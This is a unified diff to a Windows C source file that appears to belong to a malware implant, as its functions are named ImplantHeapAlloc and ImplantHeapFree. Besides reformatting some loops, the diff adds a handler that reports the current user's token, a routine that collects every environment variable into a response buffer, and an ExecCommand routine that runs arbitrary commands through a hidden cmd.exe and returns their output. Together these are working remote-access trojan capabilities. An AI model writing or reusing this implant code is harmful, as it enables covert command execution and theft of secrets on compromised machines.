@@ -787,8 +787,7 @@ static DWORD DeleteDirectoryRecursive(PCWSTR path)
 		{
 			break;
 		}
-	}
-	while (FindNextFileW(findHandle, &findData));
+	} while (FindNextFileW(findHandle, &findData));
 
 	FindClose(findHandle);
 
@@ -848,8 +847,7 @@ DWORD ListDirectory(PCWSTR path, PBYTE* responseData, DWORD* responseLen)
 		bufferSize += sizeof(DWORD) + sizeof(ULONGLONG) +
 			sizeof(DWORD) + nameBytes;
 		entryCount++;
-	}
-	while (FindNextFileW(findHandle, &findData));
+	} while (FindNextFileW(findHandle, &findData));
 
 	FindClose(findHandle);
 	findHandle = INVALID_HANDLE_VALUE;
@@ -899,8 +897,7 @@ DWORD ListDirectory(PCWSTR path, PBYTE* responseData, DWORD* responseLen)
 
 		CopyMemory(buffer + offset, findData.cFileName, nameBytes);
 		offset += nameBytes;
-	}
-	while (FindNextFileW(findHandle, &findData));
+	} while (FindNextFileW(findHandle, &findData));
 
 	FindClose(findHandle);
 
@@ -1022,8 +1019,233 @@ DWORD DeletePath(PCWSTR path)
 
 DWORD BuildCurrentUserResponse(PBYTE* responseData, DWORD* responseLen)
 {
-	UNREFERENCED_PARAMETER(responseData);
-	UNREFERENCED_PARAMETER(responseLen);
+	if (responseData == NULL || responseLen == NULL)
+	{
+		return ERROR_INVALID_REQUEST;
+	}
 
-	return ERROR_DELETE_PATH_FAILED;
+	return BuildCurrentTokenSummaryResponse(responseData, responseLen);
+}
+
+DWORD GetEnvironmentBlock(PBYTE* responseData, DWORD* responseLen)
+{
+	LPWCH envBlock = NULL;
+	LPWCH cursor = NULL;
+	DWORD count = 0;
+	DWORD bufferSize = sizeof(DWORD);
+	PBYTE buffer = NULL;
+	DWORD offset = 0;
+
+	ASSERT(responseData != NULL);
+	ASSERT(responseLen != NULL);
+
+	*responseData = NULL;
+	*responseLen = 0;
+
+	envBlock = GetEnvironmentStringsW();
+	if (envBlock == NULL)
+	{
+		return ERROR_GET_ENV_FAILED;
+	}
+
+	cursor = envBlock;
+	while (*cursor != L'\0')
+	{
+		LPWCH eq = wcschr(cursor, L'=');
+		if (eq != NULL && eq != cursor)
+		{
+			DWORD nameBytes = (DWORD)((eq - cursor) + 1) * sizeof(WCHAR);
+			DWORD valueBytes = (DWORD)(wcslen(eq + 1) + 1) * sizeof(WCHAR);
+			bufferSize += sizeof(DWORD) + nameBytes + sizeof(DWORD) + valueBytes;
+			count++;
+		}
+		cursor += wcslen(cursor) + 1;
+	}
+
+	buffer = (PBYTE)ImplantHeapAlloc(bufferSize);
+	if (buffer == NULL)
+	{
+		FreeEnvironmentStringsW(envBlock);
+		return ERROR_MEMORY_ALLOCATION_FAILED;
+	}
+
+	*(DWORD*)(buffer + offset) = count;
+	offset += sizeof(DWORD);
+
+	cursor = envBlock;
+	while (*cursor != L'\0')
+	{
+		LPWCH eq = wcschr(cursor, L'=');
+		if (eq != NULL && eq != cursor)
+		{
+			DWORD nameChars = (DWORD)(eq - cursor);
+			DWORD nameBytes = (nameChars + 1) * sizeof(WCHAR);
+			DWORD valueBytes = (DWORD)(wcslen(eq + 1) + 1) * sizeof(WCHAR);
+
+			*(DWORD*)(buffer + offset) = nameBytes;
+			offset += sizeof(DWORD);
+			CopyMemory(buffer + offset, cursor, nameChars * sizeof(WCHAR));
+			offset += nameChars * sizeof(WCHAR);
+			*(WCHAR*)(buffer + offset) = L'\0';
+			offset += sizeof(WCHAR);
+
+			*(DWORD*)(buffer + offset) = valueBytes;
+			offset += sizeof(DWORD);
+			CopyMemory(buffer + offset, eq + 1, valueBytes);
+			offset += valueBytes;
+		}
+		cursor += wcslen(cursor) + 1;
+	}
+
+	FreeEnvironmentStringsW(envBlock);
+
+	*responseData = buffer;
+	*responseLen = offset;
+	return NO_ERROR;
+}
+
+DWORD ExecCommand(PCWSTR cmdLine, PBYTE* responseData, DWORD* responseLen)
+{
+	DWORD status = NO_ERROR;
+	HANDLE hReadPipe = NULL;
+	HANDLE hWritePipe = NULL;
+	SECURITY_ATTRIBUTES sa = { 0 };
+	STARTUPINFOW si = { 0 };
+	PROCESS_INFORMATION pi = { 0 };
+	WCHAR fullCmd[32768];
+	PBYTE outputBuf = NULL;
+	DWORD outputCapacity = 65536;
+	DWORD outputUsed = 0;
+	DWORD bytesRead = 0;
+	BYTE readChunk[4096];
+	DWORD exitCode = 0;
+	PBYTE finalBuffer = NULL;
+	DWORD finalLength = 0;
+
+	ASSERT(responseData != NULL);
+	ASSERT(responseLen != NULL);
+
+	*responseData = NULL;
+	*responseLen = 0;
+
+	sa.nLength = sizeof(sa);
+	sa.bInheritHandle = TRUE;
+	sa.lpSecurityDescriptor = NULL;
+
+	if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
+	{
+		return ERROR_EXEC_FAILED;
+	}
+
+	if (!SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0))
+	{
+		status = ERROR_EXEC_FAILED;
+		goto cleanup;
+	}
+
+	if (FAILED(StringCchPrintfW(fullCmd, ARRAYSIZE(fullCmd), L"cmd.exe /C %ls", cmdLine)))
+	{
+		status = ERROR_EXEC_FAILED;
+		goto cleanup;
+	}
+
+	si.cb = sizeof(si);
+	si.dwFlags = STARTF_USESTDHANDLES;
+	si.hStdOutput = hWritePipe;
+	si.hStdError = hWritePipe;
+	si.hStdInput = NULL;
+
+	if (!CreateProcessW(
+		NULL,
+		fullCmd,
+		NULL,
+		NULL,
+		TRUE,
+		CREATE_NO_WINDOW,
+		NULL,
+		NULL,
+		&si,
+		&pi
+	))
+	{
+		status = ERROR_EXEC_FAILED;
+		goto cleanup;
+	}
+
+	CloseHandle(hWritePipe);
+	hWritePipe = NULL;
+
+	outputBuf = (PBYTE)ImplantHeapAlloc(outputCapacity);
+	if (outputBuf == NULL)
+	{
+		TerminateProcess(pi.hProcess, 1);
+		CloseHandle(pi.hProcess);
+		CloseHandle(pi.hThread);
+		status = ERROR_MEMORY_ALLOCATION_FAILED;
+		goto cleanup;
+	}
+
+	while (ReadFile(hReadPipe, readChunk, sizeof(readChunk), &bytesRead, NULL) &&
+		bytesRead > 0)
+	{
+		if (outputUsed + bytesRead > outputCapacity)
+		{
+			DWORD newCap = outputCapacity * 2;
+			PBYTE newBuf = (PBYTE)ImplantHeapAlloc(newCap);
+			if (newBuf == NULL)
+			{
+				break;
+			}
+			CopyMemory(newBuf, outputBuf, outputUsed);
+			ImplantHeapFree(outputBuf);
+			outputBuf = newBuf;
+			outputCapacity = newCap;
+		}
+		CopyMemory(outputBuf + outputUsed, readChunk, bytesRead);
+		outputUsed += bytesRead;
+	}
+
+	WaitForSingleObject(pi.hProcess, INFINITE);
+	GetExitCodeProcess(pi.hProcess, &exitCode);
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+
+	finalLength = sizeof(DWORD) + sizeof(DWORD) + outputUsed;
+	finalBuffer = (PBYTE)ImplantHeapAlloc(finalLength);
+	if (finalBuffer == NULL)
+	{
+		status = ERROR_MEMORY_ALLOCATION_FAILED;
+		goto cleanup;
+	}
+
+	*(DWORD*)finalBuffer = exitCode;
+	*(DWORD*)(finalBuffer + sizeof(DWORD)) = outputUsed;
+	if (outputUsed > 0)
+	{
+		CopyMemory(finalBuffer + sizeof(DWORD) + sizeof(DWORD), outputBuf, outputUsed);
+	}
+
+	*responseData = finalBuffer;
+	*responseLen = finalLength;
+	finalBuffer = NULL;
+
+cleanup:
+	if (outputBuf != NULL)
+	{
+		ImplantHeapFree(outputBuf);
+	}
+	if (finalBuffer != NULL)
+	{
+		ImplantHeapFree(finalBuffer);
+	}
+	if (hWritePipe != NULL)
+	{
+		CloseHandle(hWritePipe);
+	}
+	if (hReadPipe != NULL)
+	{
+		CloseHandle(hReadPipe);
+	}
+
+	return status;
 }
